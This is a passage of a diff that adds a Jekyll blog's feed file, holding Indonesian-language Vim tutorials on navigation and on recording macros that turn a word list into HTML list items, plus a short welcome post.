+&lt;noscript&gt;Please enable JavaScript to view the &lt;a href=&quot;https://disqus.com/?ref_noscript&quot;&gt;comments powered by Disqus.&lt;/a&gt;&lt;/noscript&gt;</content><author><name>Didik</name></author><summary type="html">Tutorial Vim 2 Navigasi Untuk memanfaatkan navigasi di Vim coba buka file hello.c tadi atau file yang lain. Disini saya mulai pakai Vim, untuk cara install vim dapat dilihat di distro masing-masing ;) user@localhost:~$ vim hello.c</summary></entry><entry><title type="html">Vim bagian 3</title><link href="http://localhost:4000/jekyll/update/2019/04/10/vim-tutorial-3.html" rel="alternate" type="text/html" title="Vim bagian 3" /><published>2019-04-10T00:00:00+08:00</published><updated>2019-04-10T00:00:00+08:00</updated><id>http://localhost:4000/jekyll/update/2019/04/10/vim-tutorial-3</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2019/04/10/vim-tutorial-3.html">&lt;h2 id=&quot;tutorial-vim-3-macros&quot;&gt;Tutorial Vim 3 Macros&lt;/h2&gt;
+&lt;p&gt;Untuk yang belum tau macros itu apa ? Nih link &lt;a href=&quot;https://en.wikipedia.org/wiki/Macro_(computer_science)&quot;&gt;wikipedia&lt;/a&gt;
+Gimana cara pakai nya di vim ?
+Sederhananya, misalkan kita punya file dengan isi&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ayam
+Kambing
+Kelinci
+Kerbau
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Kita mau buat menjadi&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- Ayam
+- Kambing
+- Kelinci
+- Kerbau
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;kita bisa buat macrosnya sederhana. Caranya, arahkan kursor ke huruf A di Ayam lalu ketikkan (langsung ketikkan, jangan pencet i) di NORMAL mode&lt;/p&gt;
+
+&lt;div class=&quot;language-vim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;qw0i&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;ESC&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;jq 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Keterangan&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;No&lt;/th&gt;
+      &lt;th&gt;Perintah&lt;/th&gt;
+      &lt;th&gt;Keterangan&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;1.&lt;/td&gt;
+      &lt;td&gt;qw&lt;/td&gt;
+      &lt;td&gt;mendefinisikan macro dengan nama w&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;2.&lt;/td&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt;mengarahkan cursor ke awal baris&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;3.&lt;/td&gt;
+      &lt;td&gt;i&lt;/td&gt;
+      &lt;td&gt;mengubah menjadi INSERT mode&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;4.&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;mengetik strip dan spasi&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;5.&lt;/td&gt;
+      &lt;td&gt;&amp;lt;ESC&amp;gt;&lt;/td&gt;
+      &lt;td&gt;masuk ke NORMAL mode&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;6.&lt;/td&gt;
+      &lt;td&gt;j&lt;/td&gt;
+      &lt;td&gt;mengarahkan cursor ke baris selanjutnya&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;7.&lt;/td&gt;
+      &lt;td&gt;q&lt;/td&gt;
+      &lt;td&gt;mengakhiri recording macros&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;coba panggil dengan mengetikkan&lt;/p&gt;
+
+&lt;div class=&quot;language-vim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@&lt;span class=&quot;k&quot;&gt;w&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;untuk memanggil macros berulang kali coba ketikkan&lt;/p&gt;
+
+&lt;div class=&quot;language-vim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;@&lt;span class=&quot;k&quot;&gt;w&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Apa gunanya kita buat macro ?
+Membuat macros akan sangat membantu jika ada ribuan baris yang harus di edit dengan format yang sama.
+Berikut ini adalah contohnya, terdapat source :&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Satu
+Dua
+Tiga
+Empat
+Lima
+Enam
+Tujuh
+Delapan
+Sembilan
+Sepuluh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dengan macros kita bisa membuat teks sebelumnya menjadi seperti ini :&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;ol&amp;gt;&lt;/span&gt;
+11
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;satu&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Satu&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dua&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Dua&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tiga&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Tiga&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;empat&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;4&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Empat&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lima&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;5&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Lima&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enam&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Enam&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tujuh&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;7&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Tujuh&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;delapan&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Delapan&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sembilan&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;9&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Sembilan&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sepuluh&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Sepuluh&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ol&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Sebelum menggunakan macro kita buat dulu kondisi awal dan bisa dimanfaatkan&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;ol&amp;gt;&lt;/span&gt;
+Satu
+Dua
+Tiga
+Empat
+Lima
+Enam
+Tujuh
+Delapan
+Sembilan
+Sepuluh
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;ol&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Arahkan kursornya ke huruf S di Satu, terus coba ikutin pencetan ini, percaya aja ikutin satu satu&lt;/p&gt;
+
+&lt;div class=&quot;language-vim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;qa0&lt;span class=&quot;s2&quot;&gt;&quot;bywi&amp;lt;li name=&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;ESC&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bpbg~lea&quot;&lt;/span&gt; value&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;ESC&amp;gt;gg&quot;&lt;/span&gt;cyw&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;C&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;``&lt;span class=&quot;s2&quot;&gt;&quot;cpa&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;ESC&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;ldl$&lt;span class=&quot;k&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;/li&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;ESC&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;jq
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Keterangan:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;No&lt;/th&gt;
+      &lt;th&gt;Perintah&lt;/th&gt;
+      &lt;th&gt;Keterangan&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;1.&lt;/td&gt;
+      &lt;td&gt;qa&lt;/td&gt;
+      &lt;td&gt;mendefinisikan macros dengan nama a&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;2.&lt;/td&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt;navigasi ke awal baris&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;3.&lt;/td&gt;
+      &lt;td&gt;“byw&lt;/td&gt;
+      &lt;td&gt;menyimpan (yank) dari cursor saat ini sampai w (akhir kata) ke register b&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;4.&lt;/td&gt;
+      &lt;td&gt;i&lt;/td&gt;
+      &lt;td&gt;pindah ke INSERT mode&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;5.&lt;/td&gt;
+      &lt;td&gt;&amp;lt;li name=”&lt;/td&gt;
+      &lt;td&gt;ini isinya&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;6.&lt;/td&gt;
+      &lt;td&gt;&amp;lt;ESC&amp;gt;&lt;/td&gt;
+      &lt;td&gt;pindah ke NORMAL mode&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;7.&lt;/td&gt;
+      &lt;td&gt;h&lt;/td&gt;
+      &lt;td&gt;ke kiri 1 kali&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;8.&lt;/td&gt;
+      &lt;td&gt;“bp&lt;/td&gt;
+      &lt;td&gt;mempaste dari register b&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;9.&lt;/td&gt;
+      &lt;td&gt;b&lt;/td&gt;
+      &lt;td&gt;ke awal kata&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;10.&lt;/td&gt;
+      &lt;td&gt;g~l&lt;/td&gt;
+      &lt;td&gt;toggle case ke kanan 1 kali&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;11.&lt;/td&gt;
+      &lt;td&gt;e&lt;/td&gt;
+      &lt;td&gt;pindah ke akhir kata&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;12.&lt;/td&gt;
+      &lt;td&gt;a&lt;/td&gt;
+      &lt;td&gt;pindah ke INSERT mode depan cursor (sebut saja append)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;13.&lt;/td&gt;
+      &lt;td&gt;” value=”&lt;/td&gt;
+      &lt;td&gt;ini isinya&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;14.&lt;/td&gt;
+      &lt;td&gt;&amp;lt;ESC&amp;gt;&lt;/td&gt;
+      &lt;td&gt;pindah ke NORMAL mode&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;15.&lt;/td&gt;
+      &lt;td&gt;gg&lt;/td&gt;
+      &lt;td&gt;pergi ke awal file (BOF)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;16.&lt;/td&gt;
+      &lt;td&gt;“cyw&lt;/td&gt;
+      &lt;td&gt;yank 1 kata ke register c&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;17.&lt;/td&gt;
+      &lt;td&gt;&amp;lt;C-a&amp;gt;&lt;/td&gt;
+      &lt;td&gt;nambahin angkanya&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;18.&lt;/td&gt;
+      &lt;td&gt;``&lt;/td&gt;
+      &lt;td&gt;pergi ke titik yang terakhir diedit&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;19.&lt;/td&gt;
+      &lt;td&gt;“cp&lt;/td&gt;
+      &lt;td&gt;paste dari register c&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;20.&lt;/td&gt;
+      &lt;td&gt;a&lt;/td&gt;
+      &lt;td&gt;append&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;21.&lt;/td&gt;
+      &lt;td&gt;”&amp;gt;&lt;/td&gt;
+      &lt;td&gt;ini isinya&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;22.&lt;/td&gt;
+      &lt;td&gt;&amp;lt;ESC&amp;gt;&lt;/td&gt;
+      &lt;td&gt;pindah ke NORMAL mode&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;23.&lt;/td&gt;
+      &lt;td&gt;l&lt;/td&gt;
+      &lt;td&gt;ke kanan 1 kali&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;24.&lt;/td&gt;
+      &lt;td&gt;dl&lt;/td&gt;
+      &lt;td&gt;hapus 1 char ke kanan&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;25.&lt;/td&gt;
+      &lt;td&gt;$&lt;/td&gt;
+      &lt;td&gt;pindah ke akhir baris&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;26.&lt;/td&gt;
+      &lt;td&gt;a&lt;/td&gt;
+      &lt;td&gt;append&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;27.&lt;/td&gt;
+      &lt;td&gt;&amp;lt;/li&amp;gt;&lt;/td&gt;
+      &lt;td&gt;ini isinya&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;28.&lt;/td&gt;
+      &lt;td&gt;&amp;lt;ESC&amp;gt;&lt;/td&gt;
+      &lt;td&gt;pindah ke NORMAL mode&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;29.&lt;/td&gt;
+      &lt;td&gt;j&lt;/td&gt;
+      &lt;td&gt;ke bawah 1 baris&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;30.&lt;/td&gt;
+      &lt;td&gt;q&lt;/td&gt;
+      &lt;td&gt;sudahi rekaman macros nya&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Gimana, jelas ? gampang kan ?&lt;/p&gt;
+
+&lt;p&gt;Gak percaya macros diatas udah bener ?
+Atau salah-salah melulu dari tadi mencetnya ?
+Atau males ? &amp;gt;:(&lt;/p&gt;
+
+&lt;p&gt;Ketik : terus kopas dari map sampai j (&lt;strong&gt;perintah dibawah dikopas selain tanda : diawal&lt;/strong&gt;)&lt;/p&gt;
+
+&lt;div class=&quot;language-vim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;map &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;F3&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bywi&amp;lt;li name=&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;ESC&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bpbg~lea&quot;&lt;/span&gt; value&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;ESC&amp;gt;gg&quot;&lt;/span&gt;cyw&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;C&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;``&lt;span class=&quot;s2&quot;&gt;&quot;cpa&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;ESC&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;ldl$&lt;span class=&quot;k&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;/li&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;ESC&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;j&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Arahin kurosrnya ke huruf S di Satu, terus coba ikutin pencetan ini&lt;/p&gt;
+
+&lt;div class=&quot;language-vim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;qa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;F3&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;q&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Maka terdefinisi sudah macrosnya, siap dihidangkan
+buat jalain macrosnya 9x ketika aja&lt;/p&gt;
+&lt;div class=&quot;language-vim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;m&quot;&gt;9&lt;/span&gt;@&lt;span class=&quot;k&quot;&gt;a&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Gimana ?&lt;/p&gt;
+
+&lt;p&gt;Selamat anda sudah menjadi pengguna vim :D&lt;/p&gt;
+
+&lt;p&gt;Mau yang lebih menantang, coba ke &lt;a href=&quot;https://www.vimgolf.com&quot;&gt;vimgolf&lt;/a&gt;{target=”_blank”}&lt;/p&gt;
+&lt;div id=&quot;disqus_thread&quot;&gt;&lt;/div&gt;
+&lt;script&gt;
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-dxh30-tech-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+&lt;/script&gt;
+
+&lt;noscript&gt;Please enable JavaScript to view the &lt;a href=&quot;https://disqus.com/?ref_noscript&quot;&gt;comments powered by Disqus.&lt;/a&gt;&lt;/noscript&gt;</content><author><name>Didik</name></author><summary type="html">Tutorial Vim 3 Macros Untuk yang belum tau macros itu apa ? Nih link wikipedia Gimana cara pakai nya di vim ? Sederhananya, misalkan kita punya file dengan isi</summary></entry><entry><title type="html">Welcome to my Blog!</title><link href="http://localhost:4000/jekyll/update/2019/04/07/selamat-datang.html" rel="alternate" type="text/html" title="Welcome to my Blog!" /><published>2019-04-07T23:09:15+08:00</published><updated>2019-04-07T23:09:15+08:00</updated><id>http://localhost:4000/jekyll/update/2019/04/07/selamat-datang</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2019/04/07/selamat-datang.html">&lt;p&gt;Selamat datang di Blog ini&lt;/p&gt;
+
+&lt;p&gt;Blog ini dibuat untuk writeUP CTF dan BattleCode&lt;/p&gt;
+&lt;div id=&quot;disqus_thread&quot;&gt;&lt;/div&gt;
+&lt;script&gt;
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-dxh30-tech-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+&lt;/script&gt;
+
